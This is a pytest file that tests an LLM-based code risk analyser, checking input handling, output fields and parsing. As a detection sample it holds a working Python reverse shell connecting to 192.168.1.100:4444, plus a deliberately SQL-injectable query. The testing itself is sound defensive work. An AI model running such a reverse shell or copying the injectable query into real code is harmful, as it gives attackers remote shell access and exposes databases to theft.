import pytest
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from app.models.code_analyser import CodeAnalyser


class TestCodeAnalyser:
    """
    Unit tests for the CodeAnalyser model.
    Tests cover Ollama connectivity, response structure,
    and analysis of suspicious vs benign code.
    """

    @pytest.fixture
    def analyser(self):
        return CodeAnalyser()

    def test_ollama_is_running(self, analyser):
        """Test that Ollama server is accessible."""
        assert analyser._is_ollama_running() == True

    def test_empty_input_handled(self, analyser):
        """Test that empty input is handled gracefully."""
        result = analyser.analyse("")
        assert "error" in result
        assert result["risk_level"] == "UNKNOWN"

    def test_whitespace_input_handled(self, analyser):
        """Test that whitespace only input is handled gracefully."""
        result = analyser.analyse("   ")
        assert "error" in result
        assert result["risk_level"] == "UNKNOWN"

    def test_model_name_recorded(self, analyser):
        """Test that model name is recorded for documentation."""
        result = analyser.analyse("print('hello world')")
        assert result["model_used"] == "mistral"

    def test_analyse_returns_required_fields(self, analyser):
        """Test that analysis output contains all required fields."""
        result = analyser.analyse("import os\nos.system('ls -la')")
        assert "risk_level" in result
        assert "model_used" in result
        # threat_type only present if Ollama responds successfully
        if "error" not in result:
            assert "threat_type" in result
            assert "explanation" in result

    def test_risk_level_is_valid_value(self, analyser):
        """Test that risk level is one of the expected values."""
        valid_levels = {
            "CRITICAL", "HIGH", "MEDIUM", "LOW", "SAFE", "UNKNOWN"
        }
        result = analyser.analyse("x = 1 + 1")
        assert result["risk_level"] in valid_levels

    def test_suspicious_code_flagged(self, analyser):
        """Test that reverse shell code is identified as high risk."""
        malicious_code = """
    import socket, subprocess, os
    s = socket.socket()
    s.connect(('192.168.1.100', 4444))
    os.dup2(s.fileno(), 0)
    subprocess.call(['/bin/sh', '-i'])
    """
        result = analyser.analyse(malicious_code)
        # If Ollama responds, check risk level
        if "error" not in result:
            assert result["risk_level"] in {"CRITICAL", "HIGH"}
        else:
            # Document that Ollama had an error
            assert result["risk_level"] == "UNKNOWN"

    def test_benign_code_lower_risk(self, analyser):
        """Test that benign utility code receives lower risk rating."""
        benign_code = """
    import hashlib
    def hash_file(filepath):
        sha256 = hashlib.sha256()
        with open(filepath, 'rb') as f:
            sha256.update(f.read())
        return sha256.hexdigest()
    """
        result = analyser.analyse(benign_code)
        if "error" not in result:
            assert result["risk_level"] in {"SAFE", "LOW", "MEDIUM"}
        else:
            assert result["risk_level"] == "UNKNOWN"

    def test_sql_injection_detected(self, analyser):
        """Test that SQL injection vulnerability is detected."""
        sql_code = """
    def get_user(username):
        query = f"SELECT * FROM users WHERE username = '{username}'"
        cursor.execute(query)
    """
        result = analyser.analyse(sql_code)
        if "error" not in result:
            assert result["risk_level"] in {"CRITICAL", "HIGH", "MEDIUM"}
        else:
            assert result["risk_level"] == "UNKNOWN"

    def test_prompt_is_well_formed(self, analyser):
        """Test that the prompt builder produces expected structure."""
        prompt = analyser._build_prompt("test code")
        assert "THREAT_TYPE:" in prompt
        assert "RISK_LEVEL:" in prompt
        assert "EXPLANATION:" in prompt
        assert "test code" in prompt

    def test_parse_response_extracts_fields(self, analyser):
        """Test that response parser correctly extracts structured data."""
        mock_response = """THREAT_TYPE: Reverse Shell
RISK_LEVEL: CRITICAL
CONFIDENCE: HIGH
TECHNIQUES: socket connection, process duplication
EXPLANATION: This code establishes a reverse shell connection.
INDICATORS: os.dup2, subprocess.call
RECOMMENDATION: Block and quarantine immediately"""

        result = analyser._parse_response(mock_response)

        assert result["threat_type"] == "Reverse Shell"
        assert result["risk_level"] == "CRITICAL"
        assert result["confidence"] == "HIGH"
        assert result["explanation"] == (
            "This code establishes a reverse shell connection."
        )

    def test_very_long_code_handled(self, analyser):
        """Test that very long code inputs are handled."""
        long_code = "x = 1\n" * 200
        result = analyser.analyse(long_code)
        assert "risk_level" in result

    def test_code_preview_truncated(self, analyser):
        """Test that long code is truncated in preview."""
        long_code = "x = 1\n" * 200
        result = analyser.analyse(long_code)
        if "code_preview" in result:
            assert len(result["code_preview"]) <= 203